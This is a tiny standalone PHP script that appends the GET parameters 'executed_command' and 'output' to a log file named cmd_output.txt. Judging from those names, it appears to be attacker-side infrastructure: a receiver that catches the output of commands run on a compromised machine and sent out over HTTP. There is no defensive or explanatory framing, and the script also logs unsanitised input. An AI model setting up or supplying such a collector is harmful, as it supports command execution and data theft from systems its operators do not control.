
<?php
    $f=fopen("cmd_output.txt","a+");
    fwrite($f, sprintf("
[*] Command: %s
[*] Output: %s", $_GET['executed_command'], $_GET['output']);
    fclose($f);
?>
